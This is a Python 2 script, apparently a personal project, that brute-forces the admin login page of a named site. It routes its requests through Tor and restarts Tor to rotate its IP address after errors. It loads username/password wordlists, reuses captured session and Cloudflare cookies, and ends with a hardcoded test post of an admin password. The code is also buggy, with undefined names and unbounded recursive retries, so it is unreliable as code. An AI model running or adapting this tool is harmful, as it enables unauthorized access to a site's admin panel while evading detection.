# python2
from os import system, geteuid
import requests

class User:
    def __init__(self, user='', password=''):
        self.user =user
        self.password = password

class Tor_Connection:
    @staticmethod
    def restart_tor():
        system('systemctl restart tor')
    
    
    @staticmethod    
    def get_tor_session(): 
        session = requests.session() 
        session.proxies = {'http':  'socks5://127.0.0.1:9050', 
                        'https': 'socks5://127.0.0.1:9050'} 
        return session
        
        
class Util:
    @staticmethod
    def is_root():
        return geteuid() == 0    

class BruteForce:

    def __init__(self):
        self.url = 'http://www.bancocn.com/admin/login.php'

        self.cabecalho = {
                    #'POST': '/admin/index.php HTTP/1.1',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
                    #'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    #'Accept-Language': 'en-US,en;q=0.5',
                    #'Accept-Encoding': 'gzip, deflate',
                    #'Referer': 'http://www.bancocn.com/admin/login.php',
                    #'Content-Type': 'application/x-www-form-urlencoded',
                    #'Content-Length': '27',
                    #'Connection': 'close',
                    #'Cookie': '__cfduid=d704e2ca2b7f6b003777a8b1fd4100b0b1560204167; #cf_clearance=bc91486c6a870b90aaf4e52d28a65d6c84fa7b6c-1561030825-3600-150; #PHPSESSID=32b089jh89045od963md02qgn7; user=admin&password=senhafoda;'
        }
        
        self.parametros = {
            '__cfduid':'d704e2ca2b7f6b003777a8b1fd4100b0b1560204167',
            'cf_clearance':'bc91486c6a870b90aaf4e52d28a65d6c84fa7b6c-1561030825-3600-150',
            'user':'',
            'password':''
        }
        
        self.wordList=[]
        self.adressFileWordList=''

    def load_wordlist_file(self):
        def verify_split(split):
            return len(split) == 2

        try:
            arq = open(self.adressFileWordList, 'r')
            
            try:
                for lineFile in arq: 
                    split = lineFile.split('=')
                    if(verify_split(split)):
                        add_lista_wordlist( User(user=split[0], password=split[1]) )
            except:
                print('memory limit')
                            
            arq.close()
            
        except:
            print(' --> error with file of word list.')

    def load_wordlist_memory(self, wordList=[]):
        try:
            for word in wordList:
                if(len(word) == 2):
                    self.wordList.append(word)
        except:
            print('memory limit')                    
            
    def try_loggin(self, user=User()):
        
        self.set_cookie( user )       
        
        try:
            session = Tor_Connection.get_tor_session()
            resposta = session.post(self.url, headers=self.cabecalho, params=self.parametros)
            
            if(resposta.status_code == 200):
                return True, [user, password]

        except requests.ConnectionError as e:
            print("OOPS!! Connection Error. Make sure you are connected to Internet. Technical Details given below.\n")
            print(str(e))            
            self.renewIPadress()
            self.try_loggin(user)
            #continue
            #return False, None
        
        except requests.Timeout as e:
            print("OOPS!! Timeout Error")
            print(str(e))
            self.renewIPadress()
            self.try_loggin(user)
            #continue
            #return False, None
        
        except requests.RequestException as e:
            print("OOPS!! General Error")
            print(str(e))
            self.renewIPadress()
            self.try_loggin(user)
            #continue
            #return False, None
        
        except KeyboardInterrupt:
            print("Someone closed the program")
            return False, None
        
    def renewIPadress(self):
        Tor_Connection.restart_tor()    
        
    def start_brute_force(self):
        
        for word in self.wordList:
            response, user = self.try_loggin(word) 
            
            if(response is not True):
                continue
            else:
                print('found => \
                      login: ' + user.user + \
                      'pass: ' + user.password)
                break      

    def add_lista_wordlist(self, user=User()):
        self.wordList.append( user ) 

    def set_cookie(self, user=User()):
        self.parametros['user'] = user.user
        self.parametros['password'] = user.password

    def set_url(self, url):
        if(len(url) > 0):
            self.url = str(url)

    def set_adressFileWordList(self, address):
        if(len(address) > 0):
            self.add_lista_wordlist = address

if __name__ == "__main__":
    """
    if(Util.is_root()):
        listaUser = [
                ['rednoise', 'kaka'],
                ['lokk', '321'],
                ['oppp', '5421'],
                ['933', '2134'],
                ['qlqlcoisa', '454'],
                ['admin', '878'],
                ['admin321', 'senhafoda'],
                ['admin123', 'queisso'],
                ['admin123', 'issoEhUmaSenha']
        ]
        
        bf = BruteForce()
        
        for item in listaUser:
            bf.add_lista_wordlist( User(item[0], item[1]) )
        
        bf.start_brute_force()
    else:
        print('Need to be root user.')
    """
    
    import json
    url = 'http://www.bancocn.com/admin/login.php'
    payload = {'admin': 'senhafoda'}
    headers = {
        'Host': 'www.bancocn.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://www.bancocn.com/admin/login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '29',
        'Connection': 'keep-alive',
        'Cookie': '__cfduid=d704e2ca2b7f6b003777a8b1fd4100b0b1560204167; PHPSESSID=32b089jh89045od963md02qgn7; cf_clearance=470a5301e0ae5dc8b48ec36915690f343cad1401-1561044167-3600-150'
    }
    cookies = {
        '__cfduid':'d704e2ca2b7f6b003777a8b1fd4100b0b1560204167',
        '	cf_clearance':	'470a5301e0ae5dc8b48ec36915690f343cad1401-1561044167-3600-150',
        'PHPSESSID':'32b089jh89045od963md02qgn7'
    }

    payload = {
        'user':	'admin',
        'password'	:'senhafoda'
    }    

    #r = requests.post(url, headers=headers, cookies=cookies, data=json.dumps(payload))  
    #r = requests.post(url, headers=headers, verify=False)
    ra = requests.get(url)
    rd = requests.post(url, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0'}, data=payload)
    print(rd.status_code)
    print(rd.text)
    if(ra != rd):
        print("entrou")
    
    #r = requests.post(url, data=json.dumps(payload), headers=headers)  
